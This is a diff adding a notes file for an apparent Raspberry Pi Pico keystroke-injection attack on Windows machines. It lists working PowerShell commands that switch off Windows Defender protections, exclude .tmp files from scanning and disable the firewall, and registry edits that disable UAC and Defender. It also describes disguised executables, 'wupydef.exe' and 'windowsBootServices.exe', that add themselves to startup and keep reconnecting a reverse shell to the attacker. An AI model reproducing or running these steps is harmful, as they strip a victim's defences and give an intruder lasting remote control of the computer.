@@ -1,0 +1,32 @@
+This file contains commands you would need to include in raspberry pi pico to ensure the whole system will work. (Uses DuckyScript)
+
+1. 
+Once injected, it must disable windows defender:
+    "Add-MpPreference -ExclusionExtension .tmp",
+    "Set-MpPreference -EnableControlledFolderAccess Disabled",
+    "Set-MpPreference -PUAProtection disable",
+    "Set-MpPreference -DisableBlockAtFirstSeen $true",
+    "Set-MpPreference -DisableIOAVProtection $true",
+    "Set-MpPreference -DisablePrivacyMode $true",
+    "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true",
+    "Set-MpPreference -DisableIntrusionPreventionSystem $true",
+    "Set-MpPreference -DisableScriptScanning $true",
+    "Set-MpPreference -SubmitSamplesConsent 2",
+    "Set-MpPreference -MAPSReporting 0",
+    "Set-MpPreference -HighThreatDefaultAction 6 -Force",
+    "Set-MpPreference -ModerateThreatDefaultAction 6",
+    "Set-MpPreference -LowThreatDefaultAction 6",
+    "Set-MpPreference -SevereThreatDefaultAction 6",
+    "netsh advfirewall set allprofiles state off"
+
+2. 
+Disable UAC and Windows Defender through Windows Registry:
+    'reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA'
+    'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f'
+    "reg", "add", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableAntiSpyware", "/t", "REG_DWORD", "/d", "1", "/f"
+
+3. 
+PYTHON SCRIPTS ARE ATTACHED WITH THE SAME NAME AS .exe TO ADJUST CODE IF NEEDED.
+You must have a script that will always reconnect the reverse shell if user loggs out or restarts computer. 
+There are 2 .exe scripts, "wupydef.exe" is attempting to reconnect to attacker along with disableing Defender just in case
+The "windowsBootServices.exe" diables UAC and Defender (exectly as shown in step 2) and adds "wupydef.exe" to start up registry to always reconnect to the attacker after logging in.
